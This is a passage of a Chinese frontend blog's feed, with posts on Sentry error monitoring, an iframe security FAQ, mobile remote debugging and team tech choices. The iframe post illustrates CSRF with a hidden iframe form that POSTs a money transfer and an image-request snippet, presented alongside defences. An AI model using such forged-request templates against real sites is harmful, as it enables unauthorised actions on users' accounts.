      &lt;h4 id=&quot;引子&quot;&gt;&lt;a href=&quot;#引子&quot; class=&quot;headerlink&quot; title=&quot;引子&quot;&gt;&lt;/a&gt;引子&lt;/h4&gt;&lt;p&gt;接手八年没重构的老项目，每个字符都透露着远古时期历史的气息，之前的你可能不懂那些性能优化上的思考，看了这种古老的项目，你马上就能get到现代文明之光的美好。&lt;/p&gt;
&lt;p&gt;重写不是没想过的，一万次深呼吸准备大干一场，一万次管住了自己爪爪。&lt;/p&gt;
&lt;p&gt;你还年轻，谁知道哪个页面是需要用的，哪里会藏着深坑。&lt;/p&gt;
&lt;p&gt;加一些打点统计，熟悉代码好几年，终于可以开始重构了，但是当然不能操之过急，一下推倒重来，我们选择从新增页面开始，再慢慢将老的部分迁移到新的现代化的开发模式。&lt;/p&gt;
&lt;p&gt;嗯，新项目开始啦。我们简单的选择vue+webpack+babel，完全&lt;strong&gt;前后端分离&lt;/strong&gt;的开发模式，代码层面不深入展开来说，今天只讲前端静态发布。&lt;/p&gt;
    
    </summary>
    
    
      <category term="team" scheme="https://evacoder.com/tags/team/"/>
    
  </entry>
  
  <entry>
    <title>「 基础设施 」前端异常监控系统</title>
    <link href="https://evacoder.com/2019/02/19/sentry/"/>
    <id>https://evacoder.com/2019/02/19/sentry/</id>
    <published>2019-02-19T11:37:12.000Z</published>
    <updated>2019-05-10T04:04:39.229Z</updated>
    
    <content type="html"><![CDATA[<p>遇上有人反馈bug你一般都怎么处理？</p><a id="more"></a><h4 id="bug反馈"><a href="#bug反馈" class="headerlink" title="bug反馈"></a>bug反馈</h4><p>先看看内网下自己的设备是否有报错，定位是线上问题or内网问题，内网报错：回滚内网分支。</p><p>线上报错：查看是普遍问题还是兼容性问题</p><ul><li>普遍问题着手fix</li><li>兼容性问题，询问用户设备信息，使用模拟器或者找测试同学使用相同测试机来复现，可以复现之后，如果是pc端可以f12来查看报错信息并定位（熟练使用devtool，最好有sourcemap来直接定位），移动端则使用远程调试（remote debugging 等在chrome或safari中进行复现，并定位问题））</li></ul><p>从上面我们可以发现，测试虽然测了大部分机型，但是js裸奔在各式各样的设备上，你真的能放心吗？</p><p>反馈问题我们需要：1.设备信息，2.报错提示，3.复现流程</p><p>内部反馈还好，如果是小白用户，根本不知道如何F12，更不要提移动端的错误调试，用户反馈到的很有可能就是一句（点了没反应，白屏之类的没有太多用处的信息）。</p><p>最近抛弃了ie8，各种新技术都可以用起来了。虽然使用webpack，babel已经很成熟了，也封装的越来越好，</p><p>一行browserlist&gt;1%就可以保证所有的兼容性。但是难免还是有点心慌，antd圣诞彩蛋自己被辞了也没办法找他们要赔偿啊？</p><p>虽然有内网灰度，等着别人反馈问题？周期很长的，灰度3个月你受得了？</p><p>这个时候我们真的非常需要一个前端的异常监控系统，复现流程先不奢求，只要有设备信息，js报什么错，具体的行数，一般也可以定位到问题了。</p><h4 id="异常监控系统的原理"><a href="#异常监控系统的原理" class="headerlink" title="异常监控系统的原理"></a>异常监控系统的原理</h4><p>如果让你自己实现一个异常监控系统你会怎么做？</p><p>最核心的API就是window.onerror，触发window.onerror的时候，将所有获取到的错误信息都发送一个请求到server端。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">msg, url, lineNo, columnNo, error</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当代码中的 promise reject 的时候，onerror 是捕获不到异常的。对于 promise reject 的异常，除了对每个用到 promise 的地方都加上 catch 之外，我们还应该在全局环境下进行一个兜底。</p><p>我们可以监听全局 unhandledrejection 事件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'unhandledrejection'</span>, (e) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>如果要阻止异常输出到控制台上，可以加上 e.preventDefault()。<br>通过发送请求还可以获取到设备的UA信息，ip地址。</p><p>但是线上运行的代码都是打包压缩的，报错信息并不具体，不好定位，我们需要生成sourcemap文件便于debug。</p><h4 id="sentry的使用"><a href="#sentry的使用" class="headerlink" title="sentry的使用"></a>sentry的使用</h4><p>一般公司也不会自建异常监控系统，现在有很成熟的方案，这里推荐使用sentry。</p><p>接入只需要：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://browser.sentry-cdn.com/4.6.4/bundle.min.js"</span> crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  Sentry.init(&#123;</span><br><span class="line">    dsn: <span class="string">'https://57b032907e35480d991114d212fcdda4@sentry.evacoder.com/2'</span>,</span><br><span class="line">    ignoreErrors: [],</span><br><span class="line">    release: <span class="string">"&lt;%= htmlWebpackPlugin.options.sentryRelease%&gt;"</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>或者使用npm直接安装也行，使用类似。</p><p>不用担心sentry的兼容性，因为sentry也是hook了window.onerror，而window.onerror所有浏览器有标准实现。</p><p>咋hook你懂的，可以复习下我写的这篇 <a href="https://www.evacoder.com/2019/02/15/iframe_security/" target="_blank" rel="noopener">万物皆可hook</a>。</p><p>需要注意的是我们的老朋友跨域，js报错也是会跨域的=_=#，&lt;script&gt;引入的不同源js中的错误，window.onerror只能捕获到Script error，需要在script标签添加<code>crossorigin</code>属性，并配置CORS。</p><p>iframe，css，img这些标签捕获不到错误。</p><p>另外需要注意的是：sourcemap暴露在外网可能会导致源码泄漏，所以我们部署时一定要记得去掉sourcemap。有了sentry之后我们更可以直接去掉外网暴露的sourcemap，一样可以快速定位报错具体信息。</p><p>配置sentry的sourcemap，以vue.config.js为例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> SentryPlugin = <span class="built_in">require</span>(<span class="string">'@sentry/webpack-plugin'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  productionSourceMap: <span class="literal">false</span>,</span><br><span class="line">  configureWebpack: &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="keyword">new</span> SentryPlugin(&#123;</span><br><span class="line">        include: <span class="string">'./dist'</span>,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="部署搭建sentry"><a href="#部署搭建sentry" class="headerlink" title="部署搭建sentry"></a>部署搭建sentry</h4><p>参考文档可以通过docker来部署sentry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/getsentry/onpremise.git</span><br></pre></td></tr></table></figure></p><p>按照github上的步骤一步步部署</p><p>遇到其他问题去看<a href="https://docs.sentry.io" target="_blank" rel="noopener">文档</a>，不会看文档还做程序员是害人害己哈哈哈。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;遇上有人反馈bug你一般都怎么处理？&lt;/p&gt;
    
    </summary>
    
    
      <category term="team" scheme="https://evacoder.com/tags/team/"/>
    
  </entry>
  
  <entry>
    <title>「 HTML 」iframe100问</title>
    <link href="https://evacoder.com/2019/02/18/iframe/"/>
    <id>https://evacoder.com/2019/02/18/iframe/</id>
    <published>2019-02-18T14:51:35.000Z</published>
    <updated>2019-05-14T02:39:13.048Z</updated>
    
    <content type="html"><![CDATA[<p>上篇说到iframe弹窗的登录安全，接下来我们带着问题出发，详细的了解下iframe这个历史的产物。</p><p>虽然足够古老，但是也能解决很多现代的问题。<br><a id="more"></a></p><h4 id="Frame-间的关系"><a href="#Frame-间的关系" class="headerlink" title="Frame 间的关系"></a>Frame 间的关系</h4><p>在页面中，window.top是最顶层的window，window和self都是当前window，window.parent是外层父window。</p><p>对于不存在 iframe 的页面，self，window，parent，top 这四者都相等，还有一个这 iframe中最常用的属性，frames</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span> === <span class="built_in">window</span>.frames <span class="comment">// 很奇怪的是这个一直都是true，在有子iframe的页面也是</span></span><br></pre></td></tr></table></figure><p>在有子 iframe 的页面中，这个<code>window.frames</code>就是本页面中包含的直接子frame的类数组，这个属性连接了frame 的parent，child，siblings，但是这个类数组中的元素不是直接的iframe dom，而是iframe的contentWindow，相当于是iframe环境下的window对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span> === <span class="built_in">window</span>.frames <span class="comment">// 一直都是true，所以在有子iframe的页面，window居然也是类array</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'iframe'</span>)[<span class="number">0</span>].contentWindow === <span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="父frame操作子frame"><a href="#父frame操作子frame" class="headerlink" title="父frame操作子frame"></a>父frame操作子frame</h4><p>主要通过window.frames来操作，有时候获取到子 frame 的属性为 undefined，那是因为子frame加载需要时间，要注意等子frame加载完成之后再获取。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fr1Window = <span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 或者document.getElementsByTagName("iframe")[0].contentWindow;</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">fr1Window .document.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].style.backgroundColor = <span class="string">"#ff6700"</span>;</span><br><span class="line"><span class="comment">// 操作变量</span></span><br><span class="line">fr1Window.arr1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">fr1Window.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 操作src</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"iframe"</span>)[<span class="number">0</span>].src=<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><h4 id="子frame操作父frame"><a href="#子frame操作父frame" class="headerlink" title="子frame操作父frame"></a>子frame操作父frame</h4><p>主要通过window.parent来操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parentWindow = <span class="built_in">window</span>.parent;<span class="comment">// window.top 是在多层级的页面中最顶层window</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">parentWindow .document.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].style.backgroundColor = <span class="string">"#ff6700"</span>;</span><br><span class="line"><span class="comment">// 操作变量</span></span><br><span class="line">parentWindow.arr1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">parentWindow.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 也能直接操作父frame的location，所以一定要注意iframe安全</span></span><br><span class="line">parentWindow.location.href =<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><h4 id="子frame操作相邻-frame"><a href="#子frame操作相邻-frame" class="headerlink" title="子frame操作相邻 frame"></a>子frame操作相邻 frame</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> siblingWindow = <span class="built_in">window</span>.parent.frames[<span class="number">1</span>];</span><br><span class="line">siblingWindow.document.body.style.backgroundColor = <span class="string">'#ff5700'</span>;</span><br><span class="line">siblingWindow.arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">siblingWindow.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 也能直接操作siblings frame的location，所以一定要注意iframe安全</span></span><br><span class="line">siblingWindow.location.href =<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><p>如此看来也没什么特别的，互相都可以操作，但是加上跨域就有所限制了。</p><h4 id="iframe-FAQ"><a href="#iframe-FAQ" class="headerlink" title="iframe FAQ"></a>iframe FAQ</h4><p>1<strong>.跨域情况下父子frame可以修改互相操作dom么？</strong></p><p>不行，为了安全，父子frame之间都不可互相操作dom，遵循同源策略。</p><p>但是如果一定要实现父子通信的功能，就需要另开一篇来说iframe跨域的解决方案了，主要使用 post message，先不展开细说。</p><p>2<strong>.跨域情况下子frame可以修改父window的location吗？如何禁止？</strong></p><p>可以，虽然跨域情况下不能dom操作，读取<code>parent.location.href</code>都做不到，但神奇的是却可以直接设置parent.location.href，修改父window的location。</p><p>在新版chrome会提示需要有用户交互的时候才能触发跳转，只要加上按钮引导用户点击还是可以实现跳转。</p><p>总之不是自己管理的页面都不是可信的，为了防止我们内嵌的子页面被坏人篡改或有其他漏洞，我们最好要防止内嵌的iframe修改我们的页面。</p><p>可以通过HTML5的新特性<code>sandbox</code>属性来限制iframe的行为，这个属性是反向的，如果空字符串则会应用所有的限制，sandbox包含的属性会移除对应的限制。</p><table><thead><tr><th style="text-align:left"><code>&quot;&quot;</code></th><th style="text-align:left">应用以下所有的限制。</th></tr></thead><tbody><tr><td style="text-align:left">allow-same-origin</td><td style="text-align:left">允许 iframe 内容被视为与包含文档有相同的来源。</td></tr><tr><td style="text-align:left">allow-top-navigation</td><td style="text-align:left">允许 iframe 内容从包含文档导航（加载）内容。</td></tr><tr><td style="text-align:left">allow-forms</td><td style="text-align:left">允许表单提交。</td></tr><tr><td style="text-align:left">allow-scripts</td><td style="text-align:left">允许脚本执行。</td></tr></tbody></table><p>如果不开放allow-scripts权限，iframe中的任何js都执行不了，那会造成功能失效，不是我们的初衷。</p><p>其他权限可以按需打开，只要不加上allow-top-navigation，内嵌iframe就无法操作我们的页面</p><p>所以我们需要在引入iframe处添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"iframe.html"</span> sandbox=<span class="string">"allow-scripts allow-forms"</span>&gt;</span><br></pre></td></tr></table></figure><p>内嵌的iframe就无权限修改我们页面的地址了，如果加上了<code>sandbox=&quot;allow-top-navigation&quot;</code>则会恢复权限。</p><p>但是在实际中大部分 iframe 都没有设置 sandbox 属性。</p><p><code>allow-same-origin</code>一看就很有意思，我们将在后文中提到。</p><p>插播一个，这种父子 frame 的关系和 window.open()打开的页面也有相似之处，有一个注意点是如果使用<code>target=&#39;_blank&#39;</code>打开别人的网站，一定要注意别人同样可以通过<code>window.opener</code>来控制你的网站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.opener.location=<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><p>一般人都不会想到后打开的页面居然可以控制原始页面</p><p>为了限制<code>target=&#39;_blank&#39;</code>打开的页面通过<code>window.opener</code>控制父页面，可以加上以下代码，阻止被打开的页面控制原页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">'_blank'</span> <span class="attr">rel</span>=<span class="string">'noreferrer noopener'</span> <span class="attr">href</span>=<span class="string">'https://www.otherpage.com'</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// noreferrer 针对firefox，noopener 针对其他</span><br></pre></td></tr></table></figure><p>3<strong>.如何防止自己的页面被嵌在iframe中？</strong></p><p>在上一篇文章中，我们提到了为了安全禁止了登录页被嵌在iframe中，但是一般更多的是为了预防点击劫持（clickjacking）的考虑。</p><p>如果我们有个广告页，需要靠点击量来计费，坏人把我们的页面放在一个透明度为0的iframe中，用户就可能无感知的情况下点击，广告费就猛增。</p><p>以前的做法一般是通过js在页面中加入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top !== self) &#123;</span><br><span class="line">  top.location = location</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以保证自己始终是在顶层窗口中显示，就避免了被内嵌在别人的页面中。</p><p>但是现在一般都通过服务端直接设置<code>X-Frame-Options：SAMEORIGIN</code>响应头来只允许被同域的页面内嵌。</p><p><strong>4.post请求可以跨域么？</strong></p><p>为何有这样一个问题呢？</p><p>因为了解CSRF攻击的小伙伴都知道，坏人可以在我们的页面中通过 <code>new Image().src=&#39;evacoder.com/getMoney&#39;</code> 带着我们页面中的cookie直接发出请求，但是通过img，script这类都只能发出 GET 请求。</p><p>我们常说的浏览器有跨域请求限制，实际上是 AJAX 不能跨域，这里的跨域也只是说获取不到请求的响应结果，但我们可以用 古老的form 表单来跨域，在 iframe 中提交，还可以做到form表单提交而且页面不刷新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=<span class="string">"display:none"</span>&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span>　action=<span class="string">"http://api.mi.com"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"other"</span> value=<span class="string">"XXX"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>&gt;</span><br><span class="line">　&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/i</span>frame&gt;</span><br></pre></td></tr></table></figure><p>但是需要注意的是，AJAX跨域限制只是浏览器不给JS处理响应的结果而已，所以上面的办法其实没有那么厉害，直接AJAX POST也能发送跨域请求。所以我们还需要其他的措施来防止CSRF攻击。</p><p><strong>5.可以在iframe的引用页修改iframe元素的样式吗？</strong></p><p>比如我用了google reCAPTCHA的sdk，出来的验证码是通过iframe加载的，我想要修改google的样式。</p><p>如上文所述，跨域了是不能进行 DOM 操作的，不然会有严重的安全问题，post message 也只是能在页面间传递信息而已。</p><p><strong>6.iframe 影响了类型判断</strong></p><p>在使用 iframe 时，每个frame 定义的全局变量会自动成为该 frame 中window的全局属性，而每个window对象都包含原生类型的构造函数，window对象都不相等，window.Array 和 window.frames[0].Array当然是不等的，所以会出现古怪的bug。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(el);</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">window</span>.frames[<span class="number">0</span>].Array); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>虽然我们一般不会如上面的例子那样去判断arr是不是别的frame下的Array，常用的场景是在iframe中获取parent frame的某个arr来进行类型判断，这样通过 instanceof 来判断对象的class就会出现出人意料的bug。</p><p>所以建议使用<code>Array.isArray(arr)</code>或者<code>toString.call(arr)===&#39;[object Array]&#39;</code>来判断类型。</p><p><strong>7.iframe的使用场景</strong></p><p>iframe 早已成为浏览器的规范实现，所以兼容性其实还可以，可以放心使用。</p><p>早年 iframe 经常被用在后台管理系统中的 navbar和 siderbar 的实现，主要是为了复用，现在早就不建议这么做了。</p><p>iframe 最大的好处是它一个独立的运行环境，邮箱框架中使用的比较多。</p><p>我接触到的有用在无刷新文件上传和登录页定制化（背景图开放给第三方上传管理）。</p><p><strong>8.<code>target=&quot;_blank&quot;</code></strong><br>今天突然发现引入的google reCAPTCHA iframe里的a链接：“常见问题”点完的效果是直接打开一个tab，原来<strong>iframe不仅能修改父frame的location，还可以打开一个新的tab</strong>，同样是如2中所述，加上sandbox属性可以禁止。</p><p>具体可以参考 <a href="https://www.zhihu.com/question/20653055" target="_blank" rel="noopener">知乎：iframe 的好处和坏处</a> 可以了解些历史故事，但是如果有其他替代方案最好还是不要使用 iframe。</p><p>参考</p><p><a href="https://www.zhihu.com/question/20653055" target="_blank" rel="noopener">知乎：iframe 的好处和坏处</a><br><a href="https://zhuanlan.zhihu.com/p/38538801" target="_blank" rel="noopener">Chrome 将默认屏蔽“非用户行为触发”的父页面跳转</a></p><p>想到其它有意思的点再补充吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上篇说到iframe弹窗的登录安全，接下来我们带着问题出发，详细的了解下iframe这个历史的产物。&lt;/p&gt;
&lt;p&gt;虽然足够古老，但是也能解决很多现代的问题。&lt;br&gt;
    
    </summary>
    
    
      <category term="HTML" scheme="https://evacoder.com/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>「 工具 」前端远程调试及空白或404解决</title>
    <link href="https://evacoder.com/2019/02/17/remote_debugging/"/>
    <id>https://evacoder.com/2019/02/17/remote_debugging/</id>
    <published>2019-02-17T12:11:15.000Z</published>
    <updated>2019-05-09T04:29:27.333Z</updated>
    
    <content type="html"><![CDATA[<p>因为自己的开发环境搭建的太舒适，在别人的电脑上查问题感觉完全无法展现自己的能力。</p><p>再加上已经习惯了chrome dev tool的每一种功能，一换到safari上查兼容性问题，都感觉自己变成了白痴。</p><p>更不要说去测试webview里的问题，console都没法看，真的要一行一行alert吗？</p><p>啥？你居然不会remote debugging！</p><p>那你怎么证明到底是你还是native 开发的锅？啥证据都没有。</p><p>虽然模拟器也能完成调试的功能，但是不能完全依赖模拟的结果，而且有些特定的机型并没有模拟器，有时候必须要在真机上复现问题，最重要的是模拟器没有chrome devtools呀。</p><a id="more"></a><h4 id="Andriod"><a href="#Andriod" class="headerlink" title="Andriod"></a>Andriod</h4><p>其实这个配置非常简单，用起来也方便，小伙伴们主要遇到的就是打开页面空白或者404的问题。</p><p>所以最重要的是要检查下PC能否科学地 <strong>网上冲浪</strong></p><p>有时候能访问google都不一定成功，需要试下这个地址</p><p><a href="https://chrome-devtools-frontend.appspot.com/" target="_blank" rel="noopener">https://chrome-devtools-frontend.appspot.com/</a></p><p>如果不行的话，配置以下host(不定期失效，需要保证 <a href="https://chrome-devtools-frontend.appspot.com/" target="_blank" rel="noopener">https://chrome-devtools-frontend.appspot.com/</a> 可以访问即可)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.217.161.180 chrome-devtools-frontend.appspot.com</span><br><span class="line">172.217.161.180 chrometophone.appspot.com</span><br></pre></td></tr></table></figure><p>现在访问基本上是秒开啦。</p><p>访问：<code>chrome://inspect/#devices</code></p><p>然后就可以方便的调试了。</p><p>1.在开发者模式下允许通过usb来调试</p><p>2.重新连接下usb</p><p><img src="/images/remote_debugging1.png" alt=""></p><p>出现上图，点击inspect就可以开始调试啦。</p><p>不必安装chrome浏览器，其他的浏览器和webview都可以进行调试。</p><p>如果webview测试不了，还需要<strong>安卓开发同学配置下允许调试</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView.setWebContentsDebuggingEnabled(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h4 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h4><p>iOS的remote debugging比较难，难在首先你需要一台mac哈哈哈，但是mac却可以直接调试Andriod。</p><p>1.iPhone上设置-&gt;Safari-&gt; 高级-&gt; Web 检查器，打开</p><p>2.mac 上 safara-&gt;偏好设置-&gt;高级-&gt;在菜单栏显示“开发”菜单</p><p>3.usb连接两者</p><p>4.打开 mac safari，顶部菜单中的开发，选择设备点开即可<br><img src="/images/remote_debugging2.png" alt=""></p><p>也是可以调试webview，safari</p><p>掌握了远程调试的技能，基本可以解决大部分移动端相关的问题了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为自己的开发环境搭建的太舒适，在别人的电脑上查问题感觉完全无法展现自己的能力。&lt;/p&gt;
&lt;p&gt;再加上已经习惯了chrome dev tool的每一种功能，一换到safari上查兼容性问题，都感觉自己变成了白痴。&lt;/p&gt;
&lt;p&gt;更不要说去测试webview里的问题，console都没法看，真的要一行一行alert吗？&lt;/p&gt;
&lt;p&gt;啥？你居然不会remote debugging！&lt;/p&gt;
&lt;p&gt;那你怎么证明到底是你还是native 开发的锅？啥证据都没有。&lt;/p&gt;
&lt;p&gt;虽然模拟器也能完成调试的功能，但是不能完全依赖模拟的结果，而且有些特定的机型并没有模拟器，有时候必须要在真机上复现问题，最重要的是模拟器没有chrome devtools呀。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tool" scheme="https://evacoder.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>「 基础设施 」 技术选型之路</title>
    <link href="https://evacoder.com/2019/02/16/frameworks_selection/"/>
    <id>https://evacoder.com/2019/02/16/frameworks_selection/</id>
    <published>2019-02-16T14:46:53.000Z</published>
    <updated>2019-05-10T04:04:20.430Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章是个吐槽文，小伙伴们看着玩儿吧，更希望你们能跟我分享你的观点。</p><h4 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h4><p>之前有个四年换了五份工作的技术leader，过来给我们技术分享，实际也没讲什么技术，因为主要是内部后台管理系统，主要分享了下团队管理。</p><p>他说我的团队成员很幸福，我们不用antd，不好用，我自研了ui框架，小弟们只需要搭积木一样搭起来就可以了。我招的人都学会了这个框架，每次我换工作都带着他们一起换。</p><a id="more"></a><p>因为是自研框架，自己很清楚哪里有问题，很easy就改了。</p><p>之前上一个前端团队说，这个实现不了，那个也实现不了，我们每次都能保质保量的完成，让大家都很满意。</p><p>老板问我工期，我说四周，老板说四周能行吗？给你六周吧。（下面的人说，你们老大一定不懂前端哈哈哈）</p><p>实际上我们一周就完成了，剩下的时间想干啥就干啥，这就是自己造的轮子的好处。</p><p>（时间比较久了，可能记得没那么清楚了，如果这位兄弟出来辟谣，请以他说的为准）</p><p>那我们就假设有这么个人吧，反正肯定有这样的人。</p><p>听完真的很刷新我的三观，可能这就是这位兄弟的目的，总是这么语出惊人。虽然带了调侃的语气，但是还是有些不能接受。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>一可能是我也工作快三年了，还觉得自己是个小白，有好多知识需要学习，总是带着谦卑的心去跟任何人学习，依然是一线码农（倒也并不是排斥这个身份），身边的同事们也都是这样啊，没什么好狂的，可能是有些羡慕？</p><p>二是真心觉得这样和包工头带着工程队有啥区别呢？看看这个leader四年换五份工作，轻轻松松走上人生巅峰，那自研框架的文档完善吗？代码质量值得信赖吗？测试都跑通了吗？你觉得你的框架写的好，又没有开源接受大家的检验。接手者为了扩展新需求还要去学习你写的代码，而且更惨的是他们写了好多系统，如果是不同的人来维护接手，都需要来搞懂他们的代码。</p><p>三是这对他的小弟和未来的接手者都不是好事，搞懂他的代码有啥用呢？有这时间还不如去研究vue，react的源码。小弟们天天搭积木有啥进步呢？换下一家公司之后之前的工作经验都化为灰烬，你再知道那个自研框架哪里有坑都等于0，还不如和别的前端小伙伴津津乐道下当前最流行的框架有什么坑呢！如果小弟们带着这个自研框架去别的公司那就更可怕了，又去祸害别人？</p><p>四是虽然之前觉得狗东的二五原则有点扯，但是有些东西你不深入dive in 进去研究几年，总是浮在最表层，只是自己的简历上增加几个无意义的项目而已。超哥老是吐槽我，你怎么还在写登录页啊，我只能说嗯，我以后就有十年写登录页的经验了，花式写登录页。</p><p>跟着这样的老大可能工作很愉快，天天有段子听，有时间学习，但是并不是每个人都能保持学习的，有时候很多人的学习也就是只在工作中学习，而且他说招的都是应届生，这对应届生的发展更是非常不利。</p><p>反正我们真的应该警惕这样的老大。</p><h4 id="期望"><a href="#期望" class="headerlink" 